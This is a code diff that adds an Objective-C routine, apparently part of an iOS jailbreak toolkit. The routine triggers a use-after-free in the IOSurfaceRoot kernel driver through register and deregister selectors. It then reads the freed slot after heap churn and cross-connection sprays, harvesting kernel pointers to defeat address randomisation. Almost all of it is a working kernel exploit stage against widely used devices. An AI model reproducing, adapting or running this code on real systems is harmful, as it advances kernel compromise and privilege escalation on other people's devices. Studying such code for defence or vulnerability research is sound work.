@@ -46061,3 +46061,395 @@ void iosurface_sysctl_vmregion(ISRLogBlock log, ISRDoneBlock done) {
         done(results);
     });
 }
+
+void iosurface_uaf_kptr_harvest(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(0, 0), ^{
+        log(@"JB67: === UAF Temporal Read — Kernel Pointer Harvest ===");
+        log(@"JB67: Strategy: trigger UAF, then repeatedly read freed slot hoping kernel reuses it");
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+        results[@"probe"] = @"JB67";
+
+        typedef void*(*matching_fn)(const char*);
+        typedef unsigned int(*getmatch_fn)(unsigned int, void*);
+        typedef int(*svcopen_fn)(unsigned int, unsigned int, unsigned int, unsigned int*);
+        typedef int(*svcclose_fn)(unsigned int);
+        typedef int(*callmethod_fn)(unsigned int, uint32_t, const uint64_t*, uint32_t, const void*, size_t, uint64_t*, uint32_t*, void*, size_t*);
+        typedef int(*callasync_fn)(unsigned int, uint32_t, unsigned int, uint64_t*, uint32_t, const uint64_t*, uint32_t, const void*, size_t, void*, uint32_t*, uint64_t*, uint32_t*);
+        typedef int(*objrelease_fn)(unsigned int);
+
+        matching_fn sym_m = (matching_fn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        getmatch_fn sym_g = (getmatch_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+        svcopen_fn sym_o = (svcopen_fn)dlsym(RTLD_DEFAULT, "IOServiceOpen");
+        svcclose_fn sym_c = (svcclose_fn)dlsym(RTLD_DEFAULT, "IOServiceClose");
+        callmethod_fn sym_call = (callmethod_fn)dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+        callasync_fn sym_async = (callasync_fn)dlsym(RTLD_DEFAULT, "IOConnectCallAsyncMethod");
+        objrelease_fn sym_r = (objrelease_fn)dlsym(RTLD_DEFAULT, "IOObjectRelease");
+
+        void *sm = sym_m("IOSurfaceRoot");
+        unsigned int ss = sm ? sym_g(0, sm) : 0;
+        unsigned int conn = 0;
+        int okr = ss ? sym_o(ss, mach_task_self(), 0, &conn) : -1;
+        if (ss) sym_r(ss);
+
+        if (okr != 0) {
+            results[@"verdict"] = @"NO_CONN";
+            done(results);
+            return;
+        }
+
+        NSDictionary *sp = @{
+            @"IOSurfaceAllocSize": @4096, @"IOSurfaceWidth": @64,
+            @"IOSurfaceHeight": @64, @"IOSurfaceBytesPerRow": @256,
+            @"IOSurfacePixelFormat": @0x42475241
+        };
+        uint64_t outS[4] = {0};
+        uint32_t outSCnt = 4;
+        int ckr = sym_call(conn, 0, NULL, 0,
+                           (__bridge const void *)sp, 256,
+                           outS, &outSCnt, NULL, NULL);
+        uint32_t surfID = (uint32_t)outS[0];
+        log([NSString stringWithFormat:@"JB67: EE0 create kr=0x%x surfID=%u", (unsigned)ckr, surfID]);
+
+        if (surfID == 0) {
+            results[@"verdict"] = @"NO_SURFACE";
+            sym_c(conn);
+            done(results);
+            return;
+        }
+
+        // EE1: Establish UAF — register then deregister
+        log(@"JB67: --- EE1: Establish UAF ---");
+        unsigned int wp = jb41_newWakePort();
+        uint64_t regIn[3] = {surfID, 0xAAAA, 0xBBBB};
+
+        int r17 = jb41_callSel(conn, 17, regIn, 24, 1, wp, sym_call, sym_async);
+        int r18 = jb41_callSel(conn, 18, regIn, 24, 0, wp, sym_call, sym_async);
+        log([NSString stringWithFormat:@"JB67: EE1 reg=0x%x dereg=0x%x", (unsigned)r17, (unsigned)r18]);
+
+        if (r17 != 0) {
+            results[@"verdict"] = @"REG_FAIL";
+            jb41_dropPort(wp);
+            sym_c(conn);
+            done(results);
+            return;
+        }
+        results[@"ee1_reg"] = @(r17);
+        results[@"ee1_dereg"] = @(r18);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; jb41_dropPort(wp); sym_c(conn); done(results); return; }
+
+        // EE2: Immediate stale read — read dangling slot right after free
+        log(@"JB67: --- EE2: Immediate stale read ---");
+        int ee2_reads = 0;
+        int ee2_nonzero = 0;
+        int ee2_kptrs = 0;
+        uint64_t ee2_best_ptr = 0;
+        {
+            for (int i = 0; i < 20; i++) {
+                uint64_t readIn[3] = {surfID, 0xAAAA, 0xBBBB};
+                int rr = jb41_callSel(conn, 17, readIn, 24, 1, wp, sym_call, sym_async);
+                ee2_reads++;
+
+                uint64_t checkIn[3] = {surfID, 0, 0};
+                uint8_t stBuf[64];
+                memset(stBuf, 0xCC, 64);
+                size_t stSz = 64;
+                uint64_t sOut[4] = {0};
+                uint32_t sOutC = 4;
+                int cr = sym_call(conn, 17, NULL, 0, checkIn, 24, sOut, &sOutC, stBuf, &stSz);
+
+                uint64_t *v64 = (uint64_t *)stBuf;
+                int found_nonzero = 0;
+                int found_kptr = 0;
+                for (int j = 0; j < 3; j++) {
+                    if (v64[j] != 0 && v64[j] != 0xCCCCCCCCCCCCCCCCULL) {
+                        found_nonzero = 1;
+                        if (v64[j] > 0xffff000000000000ULL && v64[j] != 0xffffffffffffffffULL) {
+                            found_kptr = 1;
+                            ee2_kptrs++;
+                            if (!ee2_best_ptr) ee2_best_ptr = v64[j];
+                        }
+                    }
+                }
+                ee2_nonzero += found_nonzero;
+
+                if (i < 5 || found_kptr || found_nonzero) {
+                    log([NSString stringWithFormat:@"JB67: EE2 i=%d rr=0x%x cr=0x%x v=[0x%llx, 0x%llx, 0x%llx] kptr=%d",
+                         i, (unsigned)rr, (unsigned)cr, v64[0], v64[1], v64[2], found_kptr]);
+                }
+
+                jb41_callSel(conn, 18, readIn, 24, 0, wp, sym_call, sym_async);
+            }
+        }
+        results[@"ee2_reads"] = @(ee2_reads);
+        results[@"ee2_nonzero"] = @(ee2_nonzero);
+        results[@"ee2_kptrs"] = @(ee2_kptrs);
+        log([NSString stringWithFormat:@"JB67: EE2 reads=%d nonzero=%d kptrs=%d best=0x%llx",
+             ee2_reads, ee2_nonzero, ee2_kptrs, ee2_best_ptr]);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; jb41_dropPort(wp); sym_c(conn); done(results); return; }
+
+        // EE3: Delayed harvest — trigger UAF then wait, let kernel reuse slot
+        log(@"JB67: --- EE3: Delayed harvest with kernel activity ---");
+        int ee3_kptrs = 0;
+        uint64_t ee3_best = 0;
+        {
+            uint64_t regIn2[3] = {surfID, 0xCCCC, 0xDDDD};
+            int r2_17 = jb41_callSel(conn, 17, regIn2, 24, 1, wp, sym_call, sym_async);
+            int r2_18 = jb41_callSel(conn, 18, regIn2, 24, 0, wp, sym_call, sym_async);
+            log([NSString stringWithFormat:@"JB67: EE3 reg=0x%x dereg=0x%x", (unsigned)r2_17, (unsigned)r2_18]);
+
+            // Generate kernel activity to cause allocations in kalloc zones
+            for (int burst = 0; burst < 5; burst++) {
+                // Create and destroy surfaces to generate kalloc churn
+                for (int k = 0; k < 8; k++) {
+                    uint64_t cOut[4] = {0};
+                    uint32_t cOutC = 4;
+                    NSDictionary *tsp = @{
+                        @"IOSurfaceAllocSize": @(4096 + k * 256),
+                        @"IOSurfaceWidth": @(32 + k), @"IOSurfaceHeight": @64,
+                        @"IOSurfaceBytesPerRow": @(128 + k * 32),
+                        @"IOSurfacePixelFormat": @0x42475241
+                    };
+                    sym_call(conn, 0, NULL, 0,
+                             (__bridge const void *)tsp, 256,
+                             cOut, &cOutC, NULL, NULL);
+                    if (cOut[0] > 0) {
+                        uint64_t delIn[3] = {(uint32_t)cOut[0], 0, 0};
+                        sym_call(conn, 1, NULL, 0, delIn, 24, NULL, NULL, NULL, NULL);
+                    }
+                }
+
+                // Now try to read the freed slot
+                uint64_t readIn3[3] = {surfID, 0xCCCC, 0xDDDD};
+                int rr3 = jb41_callSel(conn, 17, readIn3, 24, 1, wp, sym_call, sym_async);
+
+                uint8_t stBuf3[64];
+                memset(stBuf3, 0xEE, 64);
+                size_t stSz3 = 64;
+                uint64_t sOut3[4] = {0};
+                uint32_t sOutC3 = 4;
+                sym_call(conn, 17, NULL, 0, readIn3, 24, sOut3, &sOutC3, stBuf3, &stSz3);
+
+                uint64_t *v64 = (uint64_t *)stBuf3;
+                int found = 0;
+                for (int j = 0; j < 3; j++) {
+                    if (v64[j] > 0xffff000000000000ULL && v64[j] != 0xffffffffffffffffULL) {
+                        found = 1;
+                        ee3_kptrs++;
+                        if (!ee3_best) ee3_best = v64[j];
+                    }
+                }
+                log([NSString stringWithFormat:@"JB67: EE3 burst=%d rr=0x%x v=[0x%llx, 0x%llx, 0x%llx] kptr=%d",
+                     burst, (unsigned)rr3, v64[0], v64[1], v64[2], found]);
+
+                jb41_callSel(conn, 18, readIn3, 24, 0, wp, sym_call, sym_async);
+            }
+        }
+        results[@"ee3_kptrs"] = @(ee3_kptrs);
+        log([NSString stringWithFormat:@"JB67: EE3 kptrs=%d best=0x%llx", ee3_kptrs, ee3_best]);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; jb41_dropPort(wp); sym_c(conn); done(results); return; }
+
+        // EE4: Cross-connection UAF read — use conn2 to read conn1's freed slot
+        log(@"JB67: --- EE4: Cross-connection dangling read ---");
+        int ee4_kptrs = 0;
+        uint64_t ee4_best = 0;
+        {
+            void *sm2 = sym_m("IOSurfaceRoot");
+            unsigned int ss2 = sm2 ? sym_g(0, sm2) : 0;
+            unsigned int conn2 = 0;
+            int okr2 = ss2 ? sym_o(ss2, mach_task_self(), 0, &conn2) : -1;
+            if (ss2) sym_r(ss2);
+
+            if (okr2 == 0) {
+                // Create surface on conn2
+                uint64_t c2Out[4] = {0};
+                uint32_t c2OutC = 4;
+                sym_call(conn2, 0, NULL, 0,
+                         (__bridge const void *)sp, 256,
+                         c2Out, &c2OutC, NULL, NULL);
+                uint32_t sid2 = (uint32_t)c2Out[0];
+                log([NSString stringWithFormat:@"JB67: EE4 conn2=%u sid2=%u", conn2, sid2]);
+
+                if (sid2 > 0) {
+                    // Register on conn1, deregister → UAF
+                    uint64_t rIn4[3] = {surfID, 0xEEEE, 0xFFFF};
+                    jb41_callSel(conn, 17, rIn4, 24, 1, wp, sym_call, sym_async);
+                    jb41_callSel(conn, 18, rIn4, 24, 0, wp, sym_call, sym_async);
+
+                    // Now spray from conn2 — different connection, maybe different zone?
+                    for (int s = 0; s < 16; s++) {
+                        uint64_t sIn[3] = {sid2, (uint64_t)s, 0x4141414141414141ULL};
+                        jb41_callSel(conn2, 17, sIn, 24, 1, wp, sym_call, sym_async);
+                    }
+
+                    // Read from conn1's dangling ref
+                    uint64_t rIn5[3] = {surfID, 0xEEEE, 0xFFFF};
+                    jb41_callSel(conn, 17, rIn5, 24, 1, wp, sym_call, sym_async);
+
+                    uint8_t stBuf4[64];
+                    memset(stBuf4, 0xDD, 64);
+                    size_t stSz4 = 64;
+                    uint64_t sOut4[4] = {0};
+                    uint32_t sOutC4 = 4;
+                    sym_call(conn, 17, NULL, 0, rIn5, 24, sOut4, &sOutC4, stBuf4, &stSz4);
+
+                    uint64_t *v64 = (uint64_t *)stBuf4;
+                    for (int j = 0; j < 8; j++) {
+                        if (v64[j] > 0xffff000000000000ULL && v64[j] != 0xffffffffffffffffULL &&
+                            v64[j] != 0xDDDDDDDDDDDDDDDDULL) {
+                            ee4_kptrs++;
+                            if (!ee4_best) ee4_best = v64[j];
+                        }
+                    }
+
+                    log([NSString stringWithFormat:@"JB67: EE4 v=[0x%llx, 0x%llx, 0x%llx, 0x%llx] kptr=%d",
+                         v64[0], v64[1], v64[2], v64[3], ee4_kptrs]);
+
+                    // Cleanup conn2 registrations
+                    for (int s = 0; s < 16; s++) {
+                        uint64_t sIn[3] = {sid2, (uint64_t)s, 0x4141414141414141ULL};
+                        jb41_callSel(conn2, 18, sIn, 24, 0, wp, sym_call, sym_async);
+                    }
+                    jb41_callSel(conn, 18, rIn5, 24, 0, wp, sym_call, sym_async);
+                }
+                sym_c(conn2);
+            }
+        }
+        results[@"ee4_kptrs"] = @(ee4_kptrs);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; jb41_dropPort(wp); sym_c(conn); done(results); return; }
+
+        // EE5: IOSurface sel0 create output scan — check if create returns kernel metadata
+        log(@"JB67: --- EE5: sel0 create output deep scan ---");
+        int ee5_kptrs = 0;
+        uint64_t ee5_best = 0;
+        {
+            void *iosfh = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+            typedef void*(*ioscrfn)(void*);
+            typedef uint32_t(*iosgidfn)(void*);
+            typedef void*(*ioslookfn)(uint32_t);
+            typedef int(*iosgpfn)(void*, const void*, void*, size_t*, size_t*);
+            typedef void(*cfrel_fn)(void*);
+
+            ioscrfn sym_iosc = (ioscrfn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+            iosgidfn sym_gid = (iosgidfn)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+            ioslookfn sym_look = (ioslookfn)dlsym(RTLD_DEFAULT, "IOSurfaceLookup");
+            iosgpfn sym_getp = (iosgpfn)dlsym(RTLD_DEFAULT, "IOSurfaceCopyValue");
+            cfrel_fn sym_cfr = (cfrel_fn)dlsym(RTLD_DEFAULT, "CFRelease");
+
+            if (!sym_iosc) sym_iosc = iosfh ? (ioscrfn)dlsym(iosfh, "IOSurfaceCreate") : NULL;
+            if (!sym_gid) sym_gid = iosfh ? (iosgidfn)dlsym(iosfh, "IOSurfaceGetID") : NULL;
+            if (!sym_look) sym_look = iosfh ? (ioslookfn)dlsym(iosfh, "IOSurfaceLookup") : NULL;
+
+            log([NSString stringWithFormat:@"JB67: EE5 iosc=%p gid=%p look=%p iosfh=%p",
+                 sym_iosc, sym_gid, sym_look, iosfh]);
+
+            if (sym_iosc) {
+                NSDictionary *sp2 = @{
+                    @"IOSurfaceAllocSize": @8192, @"IOSurfaceWidth": @128,
+                    @"IOSurfaceHeight": @64, @"IOSurfaceBytesPerRow": @512,
+                    @"IOSurfacePixelFormat": @0x42475241
+                };
+                void *surf = sym_iosc((__bridge void *)sp2);
+                uint32_t sid = surf && sym_gid ? sym_gid(surf) : 0;
+                log([NSString stringWithFormat:@"JB67: EE5 surf=%p sid=%u", surf, sid]);
+
+                if (sid > 0) {
+                    // Try sel0 output with large struct buffer
+                    uint64_t cOut5[8] = {0};
+                    uint32_t cOutC5 = 8;
+                    uint8_t cStruct5[512];
+                    memset(cStruct5, 0, 512);
+                    size_t cStructSz5 = 512;
+
+                    int ckr5 = sym_call(conn, 0, NULL, 0,
+                                        (__bridge const void *)sp2, 512,
+                                        cOut5, &cOutC5, cStruct5, &cStructSz5);
+
+                    log([NSString stringWithFormat:@"JB67: EE5 sel0 kr=0x%x sCnt=%u stSz=%zu s0=0x%llx s1=0x%llx s2=0x%llx",
+                         (unsigned)ckr5, cOutC5, cStructSz5, cOut5[0], cOut5[1], cOut5[2]]);
+
+                    uint64_t *cs64 = (uint64_t *)cStruct5;
+                    for (int j = 0; j < (int)(cStructSz5 / 8) && j < 64; j++) {
+                        if (cs64[j] > 0xffff000000000000ULL && cs64[j] != 0xffffffffffffffffULL) {
+                            ee5_kptrs++;
+                            if (!ee5_best) ee5_best = cs64[j];
+                            log([NSString stringWithFormat:@"JB67: EE5 KPTR struct[%d]=0x%llx", j, cs64[j]]);
+                        }
+                    }
+                    for (int j = 0; j < 8; j++) {
+                        if (cOut5[j] > 0xffff000000000000ULL && cOut5[j] != 0xffffffffffffffffULL) {
+                            ee5_kptrs++;
+                            if (!ee5_best) ee5_best = cOut5[j];
+                            log([NSString stringWithFormat:@"JB67: EE5 KPTR scalar[%d]=0x%llx", j, cOut5[j]]);
+                        }
+                    }
+
+                    // Try IOSurfaceLookup with various IDs
+                    if (sym_look) {
+                        for (uint32_t tryID = 1; tryID <= sid + 2; tryID++) {
+                            void *found = sym_look(tryID);
+                            if (found && tryID <= 3) {
+                                log([NSString stringWithFormat:@"JB67: EE5 lookup(%u)=%p", tryID, found]);
+                            }
+                            if (found && sym_cfr) sym_cfr(found);
+                        }
+                    }
+
+                    // sel6 get_value with property keys — different from DD4, now with valid surface
+                    for (uint32_t pkey = 0; pkey < 32; pkey++) {
+                        uint64_t gvIn[3] = {sid, pkey, 0};
+                        uint64_t gvOut[4] = {0};
+                        uint32_t gvOutC = 4;
+                        uint8_t gvSt[128];
+                        memset(gvSt, 0, 128);
+                        size_t gvStSz = 128;
+
+                        int gvkr = sym_call(conn, 6, NULL, 0, gvIn, 24, gvOut, &gvOutC, gvSt, &gvStSz);
+                        if (gvkr == 0) {
+                            uint64_t *gv64 = (uint64_t *)gvSt;
+                            int found = 0;
+                            for (int j = 0; j < (int)(gvStSz / 8); j++) {
+                                if (gv64[j] > 0xffff000000000000ULL && gv64[j] != 0xffffffffffffffffULL) {
+                                    found++;
+                                    ee5_kptrs++;
+                                    if (!ee5_best) ee5_best = gv64[j];
+                                }
+                            }
+                            if (pkey < 5 || found > 0) {
+                                log([NSString stringWithFormat:@"JB67: EE5 sel6 key=%u kr=0x%x stSz=%zu s0=0x%llx kptr=%d",
+                                     pkey, (unsigned)gvkr, gvStSz, gvOut[0], found]);
+                            }
+                        }
+                    }
+                }
+                if (surf && sym_cfr) sym_cfr(surf);
+            } else {
+                log(@"JB67: EE5 IOSurfaceCreate not found");
+            }
+        }
+        results[@"ee5_kptrs"] = @(ee5_kptrs);
+
+        int total_kptrs = ee2_kptrs + ee3_kptrs + ee4_kptrs + ee5_kptrs;
+        uint64_t best = ee2_best_ptr;
+        if (!best) best = ee3_best;
+        if (!best) best = ee4_best;
+        if (!best) best = ee5_best;
+
+        NSString *verdict = @"NO_LEAK";
+        if (total_kptrs > 0) {
+            verdict = [NSString stringWithFormat:@"KPTR_HARVEST_%d_best_0x%llx", total_kptrs, best];
+        } else if (ee2_nonzero > 0) {
+            verdict = [NSString stringWithFormat:@"STALE_DATA_%d", ee2_nonzero];
+        }
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB67: Verdict: %@", verdict]);
+        isr_checkpoint(@"JB67-uaf-kptr-harvest-checkpoint.json", results);
+
+        jb41_dropPort(wp);
+        sym_c(conn);
+        done(results);
+    });
+}
